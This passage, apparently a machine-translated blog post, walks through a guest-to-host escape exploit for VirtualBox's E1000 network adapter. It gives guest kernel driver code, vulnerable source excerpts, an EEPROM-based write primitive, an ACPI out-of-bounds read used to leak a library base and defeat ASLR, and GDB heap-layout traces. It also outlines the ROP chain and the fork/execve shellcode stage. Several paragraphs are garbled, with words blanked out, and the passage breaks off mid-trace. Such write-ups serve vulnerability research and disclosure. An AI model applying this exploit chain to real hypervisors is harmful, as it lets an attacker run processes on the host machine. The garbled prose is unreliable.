placed in byte (255), the attacker can read outside the array, i.e.  gets a read primitive. </li><li>  With the help of a read-primitive, an attacker makes 8 requests to ACPI and receives 8 bytes from the heap.  These 8 bytes are a pointer to the VBoxDD.so dynamic library. </li><li>  The driver subtracts a constant from the pointer and gets the base address of the library VBoxDD.so. </li></ol></li><li>  Step 2: stack buffer overflow. <br><ol><li>  The loopback mode of the network adapter is enabled, so that the code containing the stack buffer overflow will be reachable. </li><li>  With the help of the main vulnerability is done integer underflow, leading to the heap buffer overflow and stack buffer overflow.  Overwrites the return address stored on the stack (RIP / EIP).  The attacker gains control of the execution. </li><li>  A chain of ROP gadgets is executed, which transfers control to the shellcode loader. </li></ol></li><li>  Step 3: shellcode. <br><ol><li>  The shellcode loader copies next to it the main shellcode from the buffer on the stack.  Control is transferred to the shellcode. </li><li>  Shellcode makes the fork and execve system calls to create an arbitrary process on the host side. </li><li>  The parent process performs the final actions so that the virtual machine does not crumble and continues normal operation. </li></ol></li><li>  The attacker unloads the driver and loads the e1000.ko ‚Äã‚Äãback so that the guest OS can continue to work with the network. </li></ol><br><h3 id="inicializaciya">  Initialization </h3><br><p>  The driver maps a portion of the physical memory corresponding to the MMIO network card to virtual memory.  The physical address and size is set by the hypervisor. </p><br><pre> <code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function">* </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">map_mmio</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">off_t</span></span> pa = <span class="hljs-number"><span class="hljs-number">0xF0000000</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">size_t</span></span> len = <span class="hljs-number"><span class="hljs-number">0x20000</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">void</span></span>* va = ioremap(pa, len); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!va) { printk(KERN_INFO PFX<span class="hljs-string"><span class="hljs-string">"ioremap failed to map MMIO\n"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> va; }</code> </pre> <br><p>  Then, the configuration of general-purpose registers E1000 is performed, the memory for the Tx-ring is allocated and the transmit-registers are configured. </p><br><pre> <code class="hljs pgsql"><span class="hljs-type"><span class="hljs-type">void</span></span> e1000_init(<span class="hljs-type"><span class="hljs-type">void</span></span>* mmio) { // Configure general purpose registers configure_CTRL(mmio); // Configure TX registers g_tx_ring = kmalloc(MAX_TX_RING_SIZE, GFP_KERNEL); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!g_tx_ring) { printk(KERN_INFO PFX"Failed to allocate TX Ring\n"); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } configure_TDBAL(mmio); configure_TDBAH(mmio); configure_TDLEN(mmio); configure_TCTL(mmio); }</code> </pre> <br><h3 id="obhod-aslr">  ASLR bypass </h3><br><h4 id="write-primitiv">  Write primitive </h4><br><p>  From the beginning of the development of the exploit, I decided to abandon the use of primitives found in the VirtualBox subsystems that are disabled by default.  First of all, it refers to the Chromium service (not the browser), which is responsible for 3D acceleration, in which over the past year, researchers have found more than 40 vulnerabilities.  Information leak is a leak of information, usually a pointer with respect to some dynamic library, from which you can get its base address and bypass the protection of ASLR. </p><br><p>  There was a problem: to find the information leak vulnerability in the components running by default.  There was an obvious thought that once our main vulnerability allows us to fill the heap, i.e.  belongs to the class heap buffer overflow, we control everything that is outside this buffer.  Then we will see that no additional vulnerabilities were needed: our integer underflow was so powerful that it gave read and write primitives, as well as information leak and stack buffer overflow. </p><br><p>  Let's see what exactly is overflowing on the heap. </p><br><pre> <code class="hljs cpp"><span class="hljs-comment"><span class="hljs-comment">/** * Device state structure. */</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">E1kState_st</span></span></span><span class="hljs-class"> {</span></span> ... <span class="hljs-keyword"><span class="hljs-keyword">uint8_t</span></span> aTxPacketFallback[E1K_MAX_TX_PKT_SIZE]; ... E1kEEPROM eeprom; ... }</code> </pre> <br><p>  Here, aTxPacketFallback is a buffer of size 0x3FA0 that will be filled with data read from the data descriptor.  Looking for what interesting fields behind this buffer can be changed, the E1kEEPROM structure came across.  Inside it there is another structure with such fields (file src / VBox / Devices / Network / DevE1000.cpp): </p><br><pre> <code class="hljs cpp"><span class="hljs-comment"><span class="hljs-comment">/** * 93C46-compatible EEPROM device emulation. */</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">EEPROM93C46</span></span></span><span class="hljs-class"> {</span></span> ... <span class="hljs-keyword"><span class="hljs-keyword">bool</span></span> m_fWriteEnabled; <span class="hljs-keyword"><span class="hljs-keyword">uint8_t</span></span> Alignment1; <span class="hljs-keyword"><span class="hljs-keyword">uint16_t</span></span> m_u16Word; <span class="hljs-keyword"><span class="hljs-keyword">uint16_t</span></span> m_u16Mask; <span class="hljs-keyword"><span class="hljs-keyword">uint16_t</span></span> m_u16Addr; <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> m_u32InternalWires; ... }</code> </pre> <br><p>  What can we give them a modification?  In the E1000 code, work with the EEPROM - the permanent memory of the network adapter is implemented.  The guest OS can access it using certain E1000 MMIO registers.  Work with EEPROM is implemented as a finite state machine, which has several states and performs four actions.  We will be interested only in the "write to memory" action.  Here‚Äôs what it looks like (src / VBox / Devices / Network / DevEEPROM.cpp file): </p><br><pre> <code class="hljs cpp">EEPROM93C46::State EEPROM93C46::opWrite() { storeWord(m_u16Addr, m_u16Word); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> WAITING_CS_FALL; } <span class="hljs-keyword"><span class="hljs-keyword">void</span></span> EEPROM93C46::storeWord(<span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> u32Addr, <span class="hljs-keyword"><span class="hljs-keyword">uint16_t</span></span> u16Value) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (m_fWriteEnabled) { E1kLog((<span class="hljs-string"><span class="hljs-string">"EEPROM: Stored word %04x at %08x\n"</span></span>, u16Value, u32Addr)); m_au16Data[u32Addr] = u16Value; } m_u16Mask = DATA_MSB; }</code> </pre> <br><p>  Here, m_u16Addr, m_u16Word and m_fWriteEnabled are the values ‚Äã‚Äãof the fields in the EEPROM93C46 structure, which we completely control.  Therefore, you can set them in such a way that </p><br><pre> <code class="hljs">m_au16Data[u32Addr] = u16Value;</code> </pre> <br><p>  two bytes will be written at an arbitrary 16-bit offset from the m_au16Data array, which is located in the same structure.  We found a write primitive. </p><br><h4 id="read-primitiv">  Read primitive </h4><br><p>  The next task was to search for data structures on the heap that would make sense to write arbitrary data, not forgetting that the main goal is to merge the pointer relative to some module in order to get its base address.  Fortunately, it was not necessary to resort to unstable filling of the heap (heap spray), since  it turned out that the basic data structures for virtual devices are separated from the internal hypervisor heap in such a way that each time VirtualBox starts, the distance between these heap blocks is the same despite the fact that the virtual block addresses each time start, of course, differ due to ASLR. </p><br><p>  Specifically, when VirtualBox is launched, the PDM (Pluggable Device and Driver Manager) subsystem for each device creates a PDMDEVINS object, which is allocated from the hypervisor heap. </p><br><pre> <code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pdmR3DevInit</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">PVM pVM</span></span></span><span class="hljs-function">)</span></span> { ... PPDMDEVINS pDevIns; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (paDevs[i].pDev-&gt;pReg-&gt;fFlags &amp; (PDM_DEVREG_FLAGS_RC | PDM_DEVREG_FLAGS_R0)) rc = MMR3HyperAllocOnceNoRel(pVM, cb, <span class="hljs-number"><span class="hljs-number">0</span></span>, MM_TAG_PDM_DEVICE, (<span class="hljs-keyword"><span class="hljs-keyword">void</span></span> **)&amp;pDevIns); <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> rc = MMR3HeapAllocZEx(pVM, MM_TAG_PDM_DEVICE, cb, (<span class="hljs-keyword"><span class="hljs-keyword">void</span></span> **)&amp;pDevIns); ...</code> </pre> <br><p>  I drove this section of code under the GDB debugger using a script and got something like this: </p><br><pre> <code class="hljs mel">[<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructing a device #<span class="hljs-number"><span class="hljs-number">0x0</span></span>: [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Name: <span class="hljs-string"><span class="hljs-string">"pcarch"</span></span>, <span class="hljs-string"><span class="hljs-string">'\000'</span></span> &lt;repeats <span class="hljs-number"><span class="hljs-number">25</span></span> times&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Description: <span class="hljs-number"><span class="hljs-number">0x7fc44d6f125a</span></span> <span class="hljs-string"><span class="hljs-string">"PC Architecture Device"</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructor: {<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> (PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)} <span class="hljs-number"><span class="hljs-number">0x7fc44d57517b</span></span> &lt;pcarchConstruct(PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Instance: <span class="hljs-number"><span class="hljs-number">0x7fc45486c1b0</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Data <span class="hljs-keyword"><span class="hljs-keyword">size</span></span>: <span class="hljs-number"><span class="hljs-number">0x8</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructing a device #<span class="hljs-number"><span class="hljs-number">0x1</span></span>: [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Name: <span class="hljs-string"><span class="hljs-string">"pcbios"</span></span>, <span class="hljs-string"><span class="hljs-string">'\000'</span></span> &lt;repeats <span class="hljs-number"><span class="hljs-number">25</span></span> times&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Description: <span class="hljs-number"><span class="hljs-number">0x7fc44d6ef37b</span></span> <span class="hljs-string"><span class="hljs-string">"PC BIOS Device"</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructor: {<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> (PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)} <span class="hljs-number"><span class="hljs-number">0x7fc44d56bd3b</span></span> &lt;pcbiosConstruct(PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Instance: <span class="hljs-number"><span class="hljs-number">0x7fc45486c720</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Data <span class="hljs-keyword"><span class="hljs-keyword">size</span></span>: <span class="hljs-number"><span class="hljs-number">0x11e8</span></span> ... [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructing a device #<span class="hljs-number"><span class="hljs-number">0xe</span></span>: [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Name: <span class="hljs-string"><span class="hljs-string">"e1000"</span></span>, <span class="hljs-string"><span class="hljs-string">'\000'</span></span> &lt;repeats <span class="hljs-number"><span class="hljs-number">26</span></span> times&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Description: <span class="hljs-number"><span class="hljs-number">0x7fc44d70c6d0</span></span> <span class="hljs-string"><span class="hljs-string">"Intel PRO/1000 MT Desktop Ethernet.\n"</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructor: {<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> (PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)} <span class="hljs-number"><span class="hljs-number">0x7fc44d622969</span></span> &lt;e1kR3Construct(PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Instance: <span class="hljs-number"><span class="hljs-number">0x7fc470083400</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Data <span class="hljs-keyword"><span class="hljs-keyword">size</span></span>: <span class="hljs-number"><span class="hljs-number">0x53a0</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructing a device #<span class="hljs-number"><span class="hljs-number">0xf</span></span>: [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Name: <span class="hljs-string"><span class="hljs-string">"ichac97"</span></span>, <span class="hljs-string"><span class="hljs-string">'\000'</span></span> &lt;repeats <span class="hljs-number"><span class="hljs-number">24</span></span> times&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Description: <span class="hljs-number"><span class="hljs-number">0x7fc44d716ac0</span></span> <span class="hljs-string"><span class="hljs-string">"ICH AC'97 Audio Controller"</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructor: {<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> (PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)} <span class="hljs-number"><span class="hljs-number">0x7fc44d66a90f</span></span> &lt;ichac97R3Construct(PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Instance: <span class="hljs-number"><span class="hljs-number">0x7fc470088b00</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Data <span class="hljs-keyword"><span class="hljs-keyword">size</span></span>: <span class="hljs-number"><span class="hljs-number">0x1848</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructing a device #<span class="hljs-number"><span class="hljs-number">0x10</span></span>: [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Name: <span class="hljs-string"><span class="hljs-string">"usb-ohci"</span></span>, <span class="hljs-string"><span class="hljs-string">'\000'</span></span> &lt;repeats <span class="hljs-number"><span class="hljs-number">23</span></span> times&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Description: <span class="hljs-number"><span class="hljs-number">0x7fc44d707025</span></span> <span class="hljs-string"><span class="hljs-string">"OHCI USB controller.\n"</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructor: {<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> (PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)} <span class="hljs-number"><span class="hljs-number">0x7fc44d5ea841</span></span> &lt;ohciR3Construct(PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Instance: <span class="hljs-number"><span class="hljs-number">0x7fc47008a4e0</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Data <span class="hljs-keyword"><span class="hljs-keyword">size</span></span>: <span class="hljs-number"><span class="hljs-number">0x1728</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructing a device #<span class="hljs-number"><span class="hljs-number">0x11</span></span>: [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Name: <span class="hljs-string"><span class="hljs-string">"acpi"</span></span>, <span class="hljs-string"><span class="hljs-string">'\000'</span></span> &lt;repeats <span class="hljs-number"><span class="hljs-number">27</span></span> times&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Description: <span class="hljs-number"><span class="hljs-number">0x7fc44d6eced8</span></span> <span class="hljs-string"><span class="hljs-string">"Advanced Configuration and Power Interface"</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructor: {<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> (PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)} <span class="hljs-number"><span class="hljs-number">0x7fc44d563431</span></span> &lt;acpiR3Construct(PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Instance: <span class="hljs-number"><span class="hljs-number">0x7fc47008be70</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Data <span class="hljs-keyword"><span class="hljs-keyword">size</span></span>: <span class="hljs-number"><span class="hljs-number">0x1570</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructing a device #<span class="hljs-number"><span class="hljs-number">0x12</span></span>: [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Name: <span class="hljs-string"><span class="hljs-string">"GIMDev"</span></span>, <span class="hljs-string"><span class="hljs-string">'\000'</span></span> &lt;repeats <span class="hljs-number"><span class="hljs-number">25</span></span> times&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Description: <span class="hljs-number"><span class="hljs-number">0x7fc44d6f17fa</span></span> <span class="hljs-string"><span class="hljs-string">"VirtualBox GIM Device"</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Constructor: {<span class="hljs-keyword"><span class="hljs-keyword">int</span></span> (PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)} <span class="hljs-number"><span class="hljs-number">0x7fc44d575cde</span></span> &lt;gimdevR3Construct(PPDMDEVINS, <span class="hljs-keyword"><span class="hljs-keyword">int</span></span>, PCFGMNODE)&gt; [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Instance: <span class="hljs-number"><span class="hljs-number">0x7fc47008dba0</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Data <span class="hljs-keyword"><span class="hljs-keyword">size</span></span>: <span class="hljs-number"><span class="hljs-number">0x90</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] Instances: [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0x0</span></span> Address: <span class="hljs-number"><span class="hljs-number">0x7fc45486c1b0</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0x1</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc45486c720</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x570</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0x2</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc4700685f0</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x1b7fbed0</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0x3</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc4700696d0</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x10e0</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0x4</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc47006a0d0</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0xa00</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0x5</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc47006a450</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x380</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0x6</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc47006a920</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x4d0</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0x7</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc47006ad50</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x430</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0x8</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc47006b240</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x4f0</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0x9</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc4548ec9a0</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0</span></span>x<span class="hljs-number"><span class="hljs-number">-1</span></span>b77e8a0 [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0xa</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc470075f90</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x1b7895f0</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0xb</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc488022000</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x17fac070</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0xc</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc47007cf80</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0</span></span>x<span class="hljs-number"><span class="hljs-number">-17</span></span>fa5080 [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0xd</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc4700820f0</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x5170</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0xe</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc470083400</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x1310</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0xf</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc470088b00</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x5700</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0x10</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc47008a4e0</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x19e0</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0x11</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc47008be70</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x1990</span></span> [<span class="hljs-keyword"><span class="hljs-keyword">trace</span></span>-device-constructors] #<span class="hljs-number"><span class="hljs-number">0x12</span></span> Address <span class="hljs-number"><span class="hljs-number">0x7fc47008dba0</span></span> differs from previous by <span class="hljs-number"><span class="hljs-number">0x1d30</span></span></code> </pre> <br><p>      0xE,  E1000.    ,    E1000     0x5700 ,  ‚Äî  0x19E0   ..     ,    ,       . </p><br><p>  E1000        : ICH IC'97, OHCI, ACPI, VirtualBox GIM.   ,   ,       write-. </p><br><p>       ACPI ( src/VBox/Devices/PC/DevACPI.cpp): </p><br><pre> <code class="hljs cpp"><span class="hljs-keyword"><span class="hljs-keyword">typedef</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ACPIState</span></span></span><span class="hljs-class"> {</span></span> ... <span class="hljs-keyword"><span class="hljs-keyword">uint8_t</span></span> au8SMBusBlkDat[<span class="hljs-number"><span class="hljs-number">32</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">uint8_t</span></span> u8SMBusBlkIdx; <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> uPmTimeOld; <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> uPmTimeA; <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> uPmTimeB; <span class="hljs-keyword"><span class="hljs-keyword">uint32_t</span></span> Alignment5; } ACPIState;</code> </pre> <br><p>      /   0x4100-0x410F.    0x4107   : </p><br><pre> <code class="hljs php">PDMBOTHCBDECL(int) acpiR3SMBusRead(PPDMDEVINS pDevIns, void *pvUser, RTIOPORT Port, uint32_t *pu32, unsigned cb) { RT_NOREF1(pDevIns); ACPIState *pThis = (ACPIState *)pvUser; ... <span class="hljs-keyword"><span class="hljs-keyword">switch</span></span> (off) { ... <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> SMBBLKDAT_OFF: *pu32 = pThis-&gt;au8SMBusBlkDat[pThis-&gt;u8SMBusBlkIdx]; pThis-&gt;u8SMBusBlkIdx++; pThis-&gt;u8SMBusBlkIdx &amp;= sizeof(pThis-&gt;au8SMBusBlkDat) - <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; ...</code> </pre> <br><p>       INB   0x4107      ,      au8SMBusBlkDat[32]   u8SMBusBlkIdx    . -     write-:          ,    EEPROM93C46.m_au16Data   ACPIState.u8SMBusBlkIdx .     ACPIState.u8SMBusBlkIdx,        255   ACPIState.au8SMBusBlkDat. </p><br><p>   .     ACPIState,  ,       ,        u8SMBusBlkIdx    ,    . ,     ACPIState  ,  . ,   ,  ,       . </p><br><pre> <code class="hljs go">gef‚û§ x/<span class="hljs-number"><span class="hljs-number">16</span></span>gx (ACPIState*)(<span class="hljs-number"><span class="hljs-number">0x7f</span></span>c47008be70+<span class="hljs-number"><span class="hljs-number">0x100</span></span>)+<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-number"><span class="hljs-number">0x7fc47008d</span></span>4e0: <span class="hljs-number"><span class="hljs-number">0xffff</span></span>e98100000090 <span class="hljs-number"><span class="hljs-number">0xfffd</span></span>9b2000000000 <span class="hljs-number"><span class="hljs-number">0x7fc47008d4f</span></span>0: <span class="hljs-number"><span class="hljs-number">0x00007f</span></span>c470067a00 <span class="hljs-number"><span class="hljs-number">0x00007f</span></span>c470067a00 <span class="hljs-number"><span class="hljs-number">0x7fc47008d</span></span>500: <span class="hljs-number"><span class="hljs-number">0x00000000a0028a00</span></span> <span class="hljs-number"><span class="hljs-number">0x00000000000e0000</span></span> <span class="hljs-number"><span class="hljs-number">0x7fc47008d</span></span>510: <span class="hljs-number"><span class="hljs-number">0x00000000000e0fff</span></span> <span class="hljs-number"><span class="hljs-number">0x0000000000001000</span></span> <span class="hljs-number"><span class="hljs-number">0x7fc47008d</span></span>520: <span class="hljs-number"><span class="hljs-number">0x000000ff</span></span>00000002 <span class="hljs-number"><span class="hljs-number">0x0000100000000000</span></span> <span class="hljs-number"><span class="hljs-number">0x7fc47008d</span></span>530: <span class="hljs-number"><span class="hljs-number">0x00007f</span></span>c47008c358 <span class="hljs-number"><span class="hljs-number">0x00007fc44d6ecd</span></span>c6 <span class="hljs-number"><span class="hljs-number">0x7fc47008d</span></span>540: <span class="hljs-number"><span class="hljs-number">0x0031000035944000</span></span> <span class="hljs-number"><span class="hljs-number">0x00000000000002b8</span></span> <span class="hljs-number"><span class="hljs-number">0x7fc47008d</span></span>550: <span class="hljs-number"><span class="hljs-number">0x00280001d</span></span>3878000 <span class="hljs-number"><span class="hljs-number">0x0000000000000000</span></span> gef‚û§ x/s <span class="hljs-number"><span class="hljs-number">0x00007fc44d6ecd</span></span>c6 <span class="hljs-number"><span class="hljs-number">0x7fc44d6ecd</span></span>c6: <span class="hljs-string"><span class="hljs-string">"ACPI RSDP"</span></span> gef‚û§ vmmap VBoxDD.so Start End Offset Perm Path <span class="hljs-number"><span class="hljs-number">0x00007fc44d4f</span></span>3000 <span class="hljs-number"><span class="hljs-number">0x00007fc44d</span></span>768000 <span class="hljs-number"><span class="hljs-number">0x0000000000000000</span></span> rx /home/user/src/VirtualBox<span class="hljs-number"><span class="hljs-number">-5.2</span></span><span class="hljs-number"><span 